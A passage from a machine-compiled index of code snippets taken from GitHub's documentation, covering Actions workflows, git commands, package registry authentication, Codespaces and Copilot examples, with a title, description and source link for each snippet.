Actions Workflow (YAML)\nDESCRIPTION: This snippet demonstrates how to reference a named branch for an action in a GitHub Actions workflow. This method is useful for referencing beta or development versions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/about-custom-actions.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n    - uses: actions/javascript-action@v1-beta\n```\n\n----------------------------------------\n\nTITLE: Removing Job Summaries - PowerShell\nDESCRIPTION: This code snippet demonstrates how to delete a job summary file in a GitHub Actions workflow using PowerShell. It appends content to the `$env:GITHUB_STEP_SUMMARY` file and then uses the `Remove-Item` cmdlet to delete the file, effectively removing the job summary for the step.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_51\n\nLANGUAGE: yaml\nCODE:\n```\n- name: Delete all summary content\n  run: |\n    \"Adding Markdown content that we want to remove before the step ends\" >> $env:GITHUB_STEP_SUMMARY\n    Remove-Item $env:GITHUB_STEP_SUMMARY\n```\n\n----------------------------------------\n\nTITLE: Adding labels at build time using docker build\nDESCRIPTION: This snippet shows how to add labels to a container image during the build process using the `docker build` command. It uses the `--label` flag to set the image source, description, and license. The image source URL depends on whether the environment is GitHub Enterprise Cloud or a self-hosted instance.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-container-registry.md#_snippet_12\n\nLANGUAGE: shell\nCODE:\n```\n$ docker build \\\n --label \"org.opencontainers.image.source=https://{% ifversion fpt or ghec %}github.com{% else %}HOSTNAME{% endif %}/octocat/my-repo\" \\\n --label \"org.opencontainers.image.description=My container image\" \\\n --label \"org.opencontainers.image.licenses=MIT\"\n```\n\n----------------------------------------\n\nTITLE: Setting authToken in .npmrc for npm registry auth (GHES subdomain)\nDESCRIPTION: This snippet demonstrates how to authenticate with the GitHub Packages npm registry by adding an authToken to the .npmrc file when subdomain isolation is enabled. The token is used to authenticate requests to the registry. `npm.pkg.github.com` should be replaced with `npm.SUBDOMAIN.ghe.com` when accessing GitHub at a different domain. `TOKEN` is your personal access token.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-npm-registry.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n//npm.pkg.github.com/:_authToken=TOKEN\n```\n\n----------------------------------------\n\nTITLE: Adding file, committing changes, pushing to remote (Git)\nDESCRIPTION: These commands demonstrate the standard Git workflow for incorporating changes into a remote repository. The `git add` command stages the 'goodbye.sh' file, `git commit` creates a commit with the message \"Add goodbye script\", and `git push` uploads the commit to the remote repository.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/composite-actions-commit-file-linux-mac.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngit add goodbye.sh\ngit commit -m \"Add goodbye script\"\ngit push\n```\n\n----------------------------------------\n\nTITLE: Previous GitHub Packages billing response example\nDESCRIPTION: This is an example of the JSON response from the previous billing platform for GitHub Packages billing.  It shows the structure and properties of the response, including total gigabytes bandwidth used, total paid gigabytes bandwidth used, and included gigabytes bandwidth.\nSOURCE: https://github.com/github/docs/blob/main/content/billing/using-the-new-billing-platform/automating-usage-reporting.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{ \"total_gigabytes_bandwidth_used\": 50, \"total_paid_gigabytes_bandwidth_used\": 40, \"included_gigabytes_bandwidth\": 10 }\n```\n\n----------------------------------------\n\nTITLE: Filtering Subfolder as Root with git-filter-repo\nDESCRIPTION: Filters the repository history to include only the specified subfolder and sets that subfolder as the root of the new repository. Requires `git-filter-repo` to be installed. Replace `FOLDER-NAME` with the subfolder name.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/splitting-a-subfolder-out-into-a-new-repository.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\n$ git filter-repo --subdirectory-filter FOLDER-NAME\n# Filter the specific branch by using a single sub-directory as the root for the new repository\n```\n\n----------------------------------------\n\nTITLE: Generating Unit Tests for BankAccount in Python\nDESCRIPTION: This code generates a unit test suite for the `BankAccount` class using the `unittest` framework. The tests cover various scenarios, including valid operations, edge cases, and exception handling for deposit, withdrawal, and balance retrieval.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/writing-tests-with-github-copilot.md#_snippet_1\n\nLANGUAGE: Python\nCODE:\n```\nimport unittest\nfrom bank_account import BankAccount\n\nclass TestBankAccount(unittest.TestCase):\n    def setUp(self):\n        self.account = BankAccount()\n\n    def test_initial_balance(self):\n        self.assertEqual(self.account.get_balance(), 0)\n\n    def test_deposit_positive_amount(self):\n        self.account.deposit(100)\n        self.assertEqual(self.account.get_balance(), 100)\n\n    def test_withdraw_within_balance(self):\n        self.account.deposit(100)\n        self.account.withdraw(50)\n        self.assertEqual(self.account.get_balance(), 50)\n\n    def test_deposit_negative_amount_raises_error(self):\n        with self.assertRaises(ValueError):\n            self.account.deposit(-100)\n\n    def test_withdraw_negative_amount_raises_error(self):\n        with self.assertRaises(ValueError):\n            self.account.withdraw(-50)\n\n    def test_withdraw_more_than_balance_raises_error(self):\n        self.account.deposit(100)\n        with self.assertRaises(ValueError):\n            self.account.withdraw(200)\n\n    def test_initial_balance_negative_raises_error(self):\n        with self.assertRaises(ValueError):\n            BankAccount(-100)\n\nif __name__ == '__main__':\n    unittest.main()\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Matrix Include Example\nDESCRIPTION: This example demonstrates how to use the `include` keyword in a GitHub Actions workflow to extend the matrix configuration. It includes several objects with key-value pairs that are either added to existing matrix combinations or create entirely new combinations based on whether overwriting original matrix values would occur.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/matrix-include.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nstrategy:\n  matrix:\n    fruit: [apple, pear]\n    animal: [cat, dog]\n    include:\n      - color: green\n      - color: pink\n        animal: cat\n      - fruit: apple\n        shape: circle\n      - fruit: banana\n      - fruit: banana\n        animal: cat\n```\n\n----------------------------------------\n\nTITLE: Internal Link with AUTOTITLE\nDESCRIPTION: This code snippet demonstrates how to use `AUTOTITLE` when linking to another {% data variables.product.prodname_docs %} page.  The application will replace `AUTOTITLE` with the actual title of the linked page during rendering.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_26\n\nLANGUAGE: text\nCODE:\n```\n* `For more information, see [AUTOTITLE](/path/to/page).`\n* `For more information, see [AUTOTITLE](/path/to/page#section-link).`\n* `For more information, see the TOOLNAME documentation in [AUTOTITLE](/path/to/page?tool=TOOLNAME).`\n```\n\n----------------------------------------\n\nTITLE: Verifying Artifact Attestations using GitHub CLI (Bash)\nDESCRIPTION: This bash snippet demonstrates how to use the `gh attestation verify` command from the GitHub CLI to verify artifact attestations generated with builds using reusable workflows. It uses flags to specify the owner, signer repository, and the signer workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-and-reusable-workflows-to-achieve-slsa-v1-build-level-3.md#_snippet_1\n\nLANGUAGE: Bash\nCODE:\n```\ngh attestation verify -o ORGANIZATION_NAME --signer-repo REUSABLE_ORGANIZATION_NAME/REUSABLE_REPOSITORY_NAME PATH/TO/YOUR/BUILD/ARTIFACT-BINARY\n```\n\n----------------------------------------\n\nTITLE: Creating a Test Workflow\nDESCRIPTION: This code snippet demonstrates a simple GitHub Actions workflow that uses the runner scale set. The `runs-on` value must match the Helm installation name from the runner scale set configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/quickstart-for-actions-runner-controller.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nname: Actions Runner Controller Demo\non:\n  workflow_dispatch:\n\njobs:\n  Explore-GitHub-Actions:\n    # You need to use the INSTALLATION_NAME from the previous step\n    runs-on: arc-runner-set\n    steps:\n    - run: echo \"🎉 This job uses runner scale set runners!\"\n```\n\n----------------------------------------\n\nTITLE: Example Configuration Output\nDESCRIPTION: This snippet showcases the expected interactive output when configuring GitHub Actions Importer, prompting for CI provider, GitHub PAT, GitHub base URL, Jenkins PAT, Jenkins username, and Jenkins base URL.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-jenkins-with-github-actions-importer.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ gh actions-importer configure\n✔ Which CI providers are you configuring?: Jenkins\nEnter the following values (leave empty to omit):\n✔ {% data variables.product.pat_generic_caps %} for GitHub: ***************\n✔ Base url of the GitHub instance: https://github.com\n✔ {% data variables.product.pat_generic_caps %} for Jenkins: ***************\n✔ Username of Jenkins user: admin\n✔ Base url of the Jenkins instance: https://localhost\nEnvironment variables successfully updated.\n```\n\n----------------------------------------\n\nTITLE: Connect to Replica Node over SSH\nDESCRIPTION: This command connects to a replica node using SSH.  It uses the `admin` user, port 122, and the specified `REPLICA_HOST`.  It requires an SSH client and network access to the replica node.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_installation/replica-ssh.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nssh -p 122 admin@REPLICA_HOST\n```\n\n----------------------------------------\n\nTITLE: Adding an SSH Key to ssh-agent (Shell)\nDESCRIPTION: This command adds an SSH private key to the ssh-agent. The ssh-agent stores the unencrypted private key in memory, allowing you to use it for SSH authentication without repeatedly entering the passphrase.  The path `~/.ssh/id_ed25519` specifies the location of the private key file.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/ssh/add-ssh-key-to-ssh-agent-commandline.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nssh-add ~/.ssh/id_ed25519\n```\n\n----------------------------------------\n\nTITLE: Starting a local Ruby server with Sinatra\nDESCRIPTION: This command starts a local Ruby server using Sinatra. It sets the port to 3000 and executes the Ruby file specified by `FILE_NAME`. The `PORT=3000` part sets an environment variable. Make sure that `FILE_NAME` is the file path to your Sinatra application.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/handling-webhook-deliveries.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\nPORT=3000 ruby FILE_NAME\n```\n\n----------------------------------------\n\nTITLE: Committing the file movement with git commit\nDESCRIPTION: This snippet shows how to commit the staged changes with `git commit -m \"Move file to new directory\"`. It commits the tracked changes, preparing them to be pushed to a remote repository. The comment explains that the command commits the tracked changes and prepares them for pushing.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-files/moving-a-file-to-a-new-location.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$ git commit -m \"Move file to new directory\"\n# Commits the tracked changes and prepares them to be pushed to a remote repository.\n# {% data reusables.git.reset-head-to-previous-commit-codeblock %}\n```\n\n----------------------------------------\n\nTITLE: Aligning text within table columns\nDESCRIPTION: This snippet shows how to align text to the left, right, or center of a table column using colons `:` in the header row. Colons on the left, right, or both sides of the hyphens control the text alignment.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/organizing-information-with-tables.md#_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n| Left-aligned | Center-aligned | Right-aligned |\n| :---         |     :---:      |          ---: |\n| git status   | git status     | git status    |\n| git diff     | git diff       | git diff      |\n```\n\n----------------------------------------\n\nTITLE: SQL Query Showing Multiple Copilot Suggestions\nDESCRIPTION: This SQL snippet illustrates how GitHub Copilot presents multiple suggestions for completing an `INNER JOIN` clause in Azure Data Studio. After typing the initial part of the query, Copilot offers various options for the join condition. This requires Copilot to be configured in Azure Data Studio.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/getting-code-suggestions-in-your-ide-with-github-copilot.md#_snippet_13\n\nLANGUAGE: sql\nCODE:\n```\nSELECT [UserId], [Red], [Orange], [Yellow], [Green], [Blue], [Purple], [Rainbow]\nFROM [Tag].[Scoreboard]\nINNER JOIN\n```\n\n----------------------------------------\n\nTITLE: Selecting Data Without Indexing in SQL\nDESCRIPTION: This SQL snippet shows a basic SELECT statement that can result in a full table scan if the 'some_column' is not indexed. This is a performance bottleneck. Dependencies: A database table named 'my_table' with a column 'some_column'.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/fixing-database-deadlocks-or-data-integrity-issues.md#_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nBEGIN TRANSACTION;\nSELECT * FROM my_table WHERE some_column = 'some_value';\n-- More actions here, then:\nCOMMIT TRANSACTION;\n```\n\n----------------------------------------\n\nTITLE: Example SCIM GET Request\nDESCRIPTION: Illustrates an example GET request to retrieve a specific user using the SCIM v2 API.  `{scim_user_id}` should be replaced with the actual SCIM user ID.  This is provided as an example of how to structure the endpoint URL.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/enterprise-admin/scim.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nGET /scim/v2/Users/{scim_user_id}\n```\n\n----------------------------------------\n\nTITLE: New GitHub Packages billing response example\nDESCRIPTION: This is an example of the JSON response from the new billing platform for GitHub Packages billing. It shows the structure and properties of the new response format, including usage items with details such as date, product, SKU, quantity, unit type, price per unit, gross amount, discount amount, net amount, organization name, and repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/billing/using-the-new-billing-platform/automating-usage-reporting.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{ \"usageItems\": [ { \"date\": \"2023-08-01\", \"product\": \"Packages\", \"sku\": \"Packages data transfer\", \"quantity\": 100, \"unitType\": \"gigabytes\", \"pricePerUnit\": 0.008, \"grossAmount\": 0.8, \"discountAmount\": 0, \"netAmount\": 0.8, \"organizationName\": \"GitHub\", \"repositoryName\": \"github/example\" } ] }\n```\n\n----------------------------------------\n\nTITLE: Setting job-level id-token permission in GitHub Actions YAML\nDESCRIPTION: This YAML snippet shows how to set the `id-token` permission to `write` at the job level in a GitHub Actions workflow file.  Setting it at the job level restricts the token to that job only. Additional permissions may be required based on the job's specific needs.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/oidc-permissions-token.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\npermissions:\n  id-token: write # This is required for requesting the JWT\n```\n\n----------------------------------------\n\nTITLE: Modifying Port Visibility using GitHub CLI\nDESCRIPTION: This command sets the visibility of a forwarded port. The syntax is `gh codespace ports visibility CODESPACE-PORT:private|org|public -c CODESPACE-NAME`. Multiple ports can have their visibility set with a single command.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/using-github-codespaces-with-github-cli.md#_snippet_12\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace ports visibility CODESPACE-PORT:private|org|public -c CODESPACE-NAME\n```\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace ports visibility 80:private 3000:public 3306:org -c CODESPACE-NAME\n```\n\n----------------------------------------\n\nTITLE: Naming a Query Suite - YAML\nDESCRIPTION: This example provides a name for the query suite using the `description` instruction.  The string after `description:` serves as the name of the query suite.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_20\n\nLANGUAGE: yaml\nCODE:\n```\n- description: <name-of-query-suite>\n```\n\n----------------------------------------\n\nTITLE: Verify Git Remote URL\nDESCRIPTION: Demonstrates verifying the updated remote URL using `git remote -v` after using `git remote set-url`. This confirms that the remote URL has been successfully changed to the new address.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/troubleshooting-cloning-errors.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\n$ git remote -v\n# Verify new remote URL\n> origin  https://github.com/ghost/ReactiveCocoa.git (fetch)\n> origin  https://github.com/ghost/ReactiveCocoa.git (push)\n```\n\n----------------------------------------\n\nTITLE: React Application Entry Point with Redux Provider\nDESCRIPTION: This code defines the entry point for the React application. It wraps the `Counter` component with the Redux `Provider` component, making the Redux store available to all connected components. It renders the application into the DOM element with the ID 'root'.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/decoupling-business-logic-from-ui-components.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nimport React from 'react';\nimport ReactDOM from 'react-dom';\nimport { Provider } from 'react-redux';\nimport store from './store';\nimport Counter from './counter';\n\nReactDOM.render(\n  <Provider store={store}>\n    <Counter />\n  </Provider>,\n  document.getElementById('root')\n);\n```\n\n----------------------------------------\n\nTITLE: Polling for Token in Ruby\nDESCRIPTION: The `poll_for_token` function repeatedly requests an access token using the device code until it receives an `access_token` or an error. It handles `authorization_pending`, `slow_down`, `expired_token`, and `access_denied` errors. Upon successful authentication, it writes the access token to a file and restricts the file permissions. It requires the `request_token` function and the `FileUtils` module.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\ndef poll_for_token(device_code, interval)\n\n  loop do\n    response = request_token(device_code)\n    error, access_token = response.values_at(\"error\", \"access_token\")\n\n    if error\n      case error\n      when \"authorization_pending\"\n        # The user has not yet entered the code.\n        # Wait, then poll again.\n        sleep interval\n        next\n      when \"slow_down\"\n        # The app polled too fast.\n        # Wait for the interval plus 5 seconds, then poll again.\n        sleep interval + 5\n        next\n      when \"expired_token\"\n        # The `device_code` expired, and the process needs to restart.\n        puts \"The device code has expired. Please run `login` again.\"\n        exit 1\n      when \"access_denied\"\n        # The user cancelled the process. Stop polling.\n        puts \"Login cancelled by user.\"\n        exit 1\n      else\n        puts response\n        exit 1\n      end\n    end\n\n    File.write(\"./.token\", access_token)\n\n    # Set the file permissions so that only the file owner can read or modify the file\n    FileUtils.chmod(0600, \"./.token\")\n\n    break\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Running a job within a container (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to define a container to run a job within. It specifies the container image, environment variables, ports, volumes, and options. The step then runs a command to check for the existence of the `.dockerenv` file inside the container.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/section-running-jobs-in-a-container.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: CI\non:\n  push:\n    branches: [ main ]\njobs:\n  container-test-job:\n    runs-on: ubuntu-latest\n    container:\n      image: node:18\n      env:\n        NODE_ENV: development\n      ports:\n        - 80\n      volumes:\n        - my_docker_volume:/volume_mount\n      options: --cpus 1\n    steps:\n      - name: Check for dockerenv file\n        run: (ls /.dockerenv && echo Found dockerenv) || (echo No dockerenv)\n```\n\n----------------------------------------\n\nTITLE: HTML Table Alignment\nDESCRIPTION: This HTML table demonstrates column alignment using the `align` attribute within the `<th>` and `<td>` tags. It shows how to achieve left and center alignment for different columns. The octicon directives are present within the table cells.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_35\n\nLANGUAGE: HTML\nCODE:\n```\n<table >\n<thead>\n<tr>\n<th align=left>Option</th>\n<th align=center>Required</th>\n<th align=center>Security Updates</th>\n<th align=center>Version Updates</th>\n<th align=left>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=left><code>package-ecosystem</code></td>\n<td align=center>\n{% octicon \"check\" aria-label=\"Supported\" %}\n</td>\n<td align=center>\n{% octicon \"x\" aria-label=\"Not supported\" %}\n</td>\n<td align=center>\n{% octicon \"check\" aria-label=\"Supported\" %}\n</td>\n<td align=left>Package manager to use</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>directory</code></td>\n<td align=center>\n{% octicon \"check\" aria-label=\"Supported\" %}\n</td>\n</td>\n<td align=center>\n{% octicon \"x\" aria-label=\"Not supported\" %}\n</td>\n<td align=center>\n{% octicon \"check\" aria-label=\"Supported\" %}\n</td>\n</td>\n<td align=left>Location of package manifests</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>schedule.interval</code></td>\n<td align=center>\n{% octicon \"check\" aria-label=\"Supported\" %}\n</td>\n</td>\n<td align=center>\n{% octicon \"x\" aria-label=\"Not supported\" %}\n</td>\n<td align=center>\n{% octicon \"check\" aria-label=\"Supported\" %}\n</td>\n</td>\n<td align=left>How often to check for updates</td>\n</tr>\n</tbody>\n</table>\n```\n\n----------------------------------------\n\nTITLE: Configuring Runner Job (Runner Jobs) - YAML\nDESCRIPTION: This YAML snippet shows how to configure a runner job within a GitHub Actions workflow to use a PostgreSQL service container when the job runs directly on the runner machine. It sets the `runs-on` key to `ubuntu-latest`, specifying a Linux environment. The `services` block defines the `postgres` service, setting its image, password, health check options, and mapping port 5432 from the container to the host.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/creating-postgresql-service-containers.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  # Label of the runner job\n  runner-job:\n    # You must use a Linux environment when using service containers or container jobs\n    runs-on: ubuntu-latest\n\n    # Service containers to run with `runner-job`\n    services:\n      # Label used to access the service container\n      postgres:\n        # Docker Hub image\n        image: postgres\n        # Provide the password for postgres\n        env:\n          POSTGRES_PASSWORD: postgres\n        # Set health checks to wait until postgres has started\n        options: >-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n        ports:\n          # Maps tcp port 5432 on service container to the host\n          - 5432:5432\n```\n\n----------------------------------------\n\nTITLE: Configuring CI Workflow with Path Filtering in YAML\nDESCRIPTION: This snippet demonstrates a GitHub Actions workflow configuration that includes path filtering for pull requests. The workflow is triggered only when changes are made in the `scripts` directory. The workflow defines a build job that runs on Ubuntu, uses a node matrix strategy, checks out the code, sets up Node.js, installs dependencies, builds, and runs tests.  It requires the workflow to complete successfully for a pull request to be merged.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/collaborating-on-repositories-with-code-quality-features/troubleshooting-required-status-checks.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nname: ci\non:\n  pull_request:\n    paths:\n      - 'scripts/**'\njobs:\n  build:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        node-version: [12.x, 14.x, 16.x]\n    steps:\n    - uses: {% data reusables.actions.action-checkout %}\n    - name: Use Node.js {% raw %}${{ matrix.node-version }}{% endraw %}\n      uses: {% data reusables.actions.action-setup-node %}\n      with:\n        node-version: {% raw %}${{ matrix.node-version }}{% endraw %}\n        cache: 'npm'\n    - run: npm ci\n    - run: npm run build --if-present\n    - run: npm test\n```\n\n----------------------------------------\n\nTITLE: Looping through Deprecated Releases (Legacy Format)\nDESCRIPTION: This snippet iterates through deprecated releases with the legacy format and generates a table row, including release date, deprecation date, support status (always 'Not supported'), release notes (from enterprise.github.com), and documentation links. Liquid template language.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/all-releases.md#_snippet_2\n\nLANGUAGE: Liquid\nCODE:\n```\n{%- for version in enterpriseServerReleases.deprecatedReleasesWithLegacyFormat %}\n| {{version}} | {{enterpriseServerReleases.dates[version].releaseDate}} | {{enterpriseServerReleases.dates[version].deprecationDate}} | {% octicon \"x\" aria-label=\"Not supported\" %} | [{{version}} release notes](https://enterprise.github.com/releases/series/{{version}}) | [{{version}} documentation](/enterprise/{{version}}) |\n{%- endfor %}\n```\n\n----------------------------------------\n\nTITLE: YAML Variable Definition\nDESCRIPTION: This YAML snippet defines two variables: `meaning_of_life` with the value 42, and a nested variable `nested.values.too` with the value \"Yes!\". The file is named `bar.yml` and is located in the `data/variables/foo/` directory.  These variables can be accessed in documentation using Liquid syntax.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/creating-reusable-content.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# the YAML file can contain multiple short strings in one file\nmeaning_of_life: 42\n\n# the strings can also be nested if needed\nnested:\n  values:\n    too: Yes!\n```\n\n----------------------------------------\n\nTITLE: Masking an environment variable in YAML using PowerShell\nDESCRIPTION: This snippet shows how to mask the value of an environment variable in a GitHub Actions workflow defined in YAML, using PowerShell. The `add-mask` command is used to prevent the environment variable's value from appearing in the logs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_18\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  powershell-example:\n    runs-on: windows-latest\n    env:\n      MY_NAME: \"Mona The Octocat\"\n    steps:\n      - name: powershell-version\n        run: Write-Output \"::add-mask::$env:MY_NAME\"\n```\n\n----------------------------------------\n\nTITLE: Conditional Logic with If/Else Statements in Java\nDESCRIPTION: This Java method uses a series of `if` and `else if` statements to determine which operation to perform based on the input `animal`. It checks for null input and compares the animal name (case-insensitive) to specific values, returning a corresponding sound or \"Unknown\" if no match is found.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/refactoring-code-with-github-copilot.md#_snippet_8\n\nLANGUAGE: Java\nCODE:\n```\npublic String getSound(String animal) {\n  if (animal == null) {\n      System.out.println(\"Oops! A null animal?\");\n  } else if (animal.equalsIgnoreCase(\"Dog\")) {\n      return \"Bark\";\n  } else if ( animal.equalsIgnoreCase(\"Cat\")) {\n      return \"Meow\";\n  } else if ( animal.equalsIgnoreCase(\"Bird\")) {\n      return \"Tweet\";\n  }\n  return \"Unknown\";\n}\n```\n\n----------------------------------------\n\nTITLE: Deleting a Codespace using GitHub CLI\nDESCRIPTION: This command deletes a codespace. The `-c` flag specifies the name of the codespace to be deleted. If the flag is omitted, a list of available codespaces is shown for selection. Deleting a codespace permanently removes it and its associated data, unless persisted to a repository branch.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/using-github-codespaces-with-github-cli.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace delete -c CODESPACE-NAME\n```\n\n----------------------------------------\n\nTITLE: Configuring Dependency Groups in dependabot.yml\nDESCRIPTION: This YAML snippet demonstrates an incorrect configuration of dependency groups in a `dependabot.yml` file, where an `allow` key with a `dependency-type` restricts the job to production dependencies, causing a subsequent group defined for development dependencies to be empty.  This results in individual pull requests being created instead of a grouped pull request.  The key is to avoid configuration settings that cancel each other out.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/troubleshooting-dependabot/troubleshooting-dependabot-errors.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nallow:\n  dependency-type: production\n  # this restricts the entire job to production dependencies\n  groups:\n      development-dependencies:\n        dependency-type: \"development\"\n        # this group will always be empty\n```\n\n----------------------------------------\n\nTITLE: Enabling GitHub Actions\nDESCRIPTION: This snippet prepares the staging instance to enable GitHub Actions. It sets the `app.actions.enabled` configuration to `true`. This is a prerequisite step before applying the overall configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/setting-up-a-staging-instance.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.actions.enabled true\n```\n\n----------------------------------------\n\nTITLE: Creating a GitHub repository using gh repo create\nDESCRIPTION: This command initiates the process of creating a new repository on GitHub. It prompts the user for necessary information during the interactive session.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/quickstart.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ngh repo create\n```\n\n----------------------------------------\n\nTITLE: Applying GitHub Configuration - Shell\nDESCRIPTION: This snippet applies the configuration changes made to the GitHub Enterprise Server instance.  Applying the configuration may cause a brief downtime for users, as services on the instance may restart.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-github-connect/enabling-github-connect-for-ghecom.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-config-apply\n```\n\n----------------------------------------\n\nTITLE: Forecasting for multiple GitLab namespaces\nDESCRIPTION: To forecast an entire namespace and all of its subgroups, you must specify each subgroup in the `--namespace` argument or `NAMESPACE` environment variable. The following command demonstrates this functionality.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer forecast gitlab --namespace my-gitlab-namespace my-gitlab-namespace/subgroup-one my-gitlab-namespace/subgroup-two ...\n```\n\n----------------------------------------\n\nTITLE: Viewing Classroom Information using GitHub CLI\nDESCRIPTION: This command displays detailed information about a specific classroom. It requires the GitHub CLI, the GitHub Classroom extension, and the classroom identifier. The output includes classroom ID, slug, title, and other relevant details printed to the console.\nSOURCE: https://github.com/github/docs/blob/main/content/education/manage-coursework-with-github-classroom/teach-with-github-classroom/using-github-classroom-with-github-cli.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh classroom view\n```\n\n----------------------------------------\n\nTITLE: Committing the Script (Windows) within Same Repo\nDESCRIPTION: Commits the `goodbye.sh` script to the Git repository with the message \"Add goodbye script\" and pushes the changes to the remote repository. These commands are essential for version control and ensuring that the script is available to the composite action.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-composite-action.md#_snippet_10\n\nLANGUAGE: Shell\nCODE:\n```\ngit commit -m \"Add goodbye script\"\ngit push\n```\n\n----------------------------------------\n\nTITLE: Reinstalling Node Modules (Shell)\nDESCRIPTION: This command completely removes the `node_modules` directory and reinstalls all dependencies. Use this when a simple `npm install` doesn't resolve the problem.\nSOURCE: 